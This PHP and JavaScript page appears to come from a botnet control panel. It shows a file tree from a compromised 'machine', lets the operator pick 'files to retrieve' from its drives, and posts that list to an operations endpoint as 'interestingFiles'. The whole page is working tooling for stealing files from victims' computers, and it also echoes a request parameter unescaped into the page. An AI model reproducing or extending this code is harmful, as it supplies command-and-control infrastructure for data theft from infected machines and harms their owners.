<?php 
if(!isset($_GET['machineID']) || (isset($_GET['machineID']) && $_GET['machineID']=="")){
	echo "<script>window.location.replace(\"/controlpanel/?section=botnet\");</script>";
}
?>
<style>
.demo-card-wide.mdl-card {
	width: 100%;
	min-height: inherit;
	padding: 15px;
	margin-bottom: 5px;
}
.demo-card-wide > .mdl-card__menu {
	color: #fff;
}
td{
		border:1px solid;
	}
	 ul>li>ul {
    	display: none;
    }
	.liSpan{
		cursor: pointer;
		
	}
	.liSpan:hover{
		font-weight: bold;
	}
	ul{
	list-style: none;
	}
</style>
 
<div class="mdl-grid demo-content">
  <div class="demo-card-wide mdl-card mdl-shadow--2dp">
	  <h3>File Manager</h3>
	  <h5>Machine#<?php echo $_GET["machineID"]; ?></h5>
	  <div style="text-align: center;">
		  <button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="backToMachine()" style="width: 100px;"><i style="margin-left: auto; margin-right: auto;" class="fas fa-arrow-circle-left"></i></button>
	  </div>
   </div>
   <div id="filesTab" class="files demo-card-wide mdl-card mdl-shadow--2dp">
	   <h4>Files to retrieve</h4>
	  <div style="text-align: center;">
		  <button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="saveFilesList()" style="width: 100px;"><i  style="margin-left: auto; margin-right: auto;" class="fas fa-save"></i></button>
	  </div>
	  <div id="filesContainer">
		  <ul class="tree" id="tree">
			  <li id="drawHere"><input type="checkbox" /><span class="liSpan">All Drives</span></li>
		  </ul>
	  </div>
	</div>
</div>

<script>
var convert = function(lines) {
  var output = {};
  lines.forEach(function(line) {
    var folders = line.split("\\")
    var parent = output;
    folders.forEach(function(f) {
      parent[f] = parent[f] || {};
      parent = parent[f];
    });
  });
  return (output);
} 

var drawFolders = function(input) {
  var output = "<ul>";
  Object.keys(input).forEach(function(k) {
    output += '<li><input type="checkbox" name="' + k+'" /><span class="liSpan">' + k+'</span>';
    if (Object.keys(input[k]).length) {
      output += drawFolders(input[k]);
    }
  else{
	  output+='<span style="display:none;" class="leaf"></span>';
  }
    output += "</li>";
  });
  output += "</ul>";
 
  return output;
}

$( document ).ready(function() {
    $('.liSpan').click(function(e){
    	e.stopPropagation();
		var element= this.parentElement.getElementsByTagName("ul")[0];
    	if(element!=undefined && element.style.display =="block")
    		$(this.parentElement).find("ul").slideUp();
    	else
    		$(this.parentElement).children(":first").next().next().slideDown();
    });
});

	
	$.ajax({
    url:'../machines/<?php echo $_GET["machineID"];?>/filesIndex.txt',
	async: false,
    success: function (data){
		document.getElementById("drawHere").innerHTML += drawFolders(convert(data.split("\n")));
    }
  });
	
	$('input[type=checkbox]').click(function () {
    var cur = $(this);
    cur.next().next().find('input[type=checkbox]').prop('checked', this.checked);
    if (this.checked) {
        cur.parents('li').children('input[type=checkbox]').prop('checked', true);
    } else while (cur.attr('id') != 'tree' && !(cur = cur.parent().parent()).find('input:checked').length) {
        cur.prev().prev().prop('checked', false);
    }
});
	
function backToMachine() {
	 window.location.href ="/controlpanel/?section=machine&machineID=<?php echo $_GET["machineID"]; ?>";
}
	
function saveFilesList() {
	var lis = document.getElementsByClassName("leaf");
	var fullPath;
	var filesToRetrieve="";
	var file;
	var current;
	for(var i=0,len=lis.length; i<len;i++){
		current=lis[i].previousSibling.previousSibling;
		if(current.checked){
			fullPath=current.name;
			current=current.parentElement.parentElement.parentElement.getElementsByClassName("liSpan")[0];
			while(current.innerHTML!="All Drives"){
				fullPath=current.innerHTML+'\\'+fullPath;
				current=current.parentElement.parentElement.parentElement.getElementsByClassName("liSpan")[0];
			}
			filesToRetrieve+=fullPath.split("\t")[0]+"\n";
		}
	}
	
	var body = "operation=interestingFiles&id=<?php echo $_GET["machineID"]; ?>&value="+encodeURIComponent(filesToRetrieve);
	
	var xhttp = new XMLHttpRequest();
  	xhttp.open("POST", "operations.php", true);
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	//xhttp.setRequestHeader("Content-Length", body.length);
	//xhttp.setRequestHeader("Connection", "close");
	xhttp.send(body);
	
	
	
	//console.log(filesToRetrieve);
}
</script>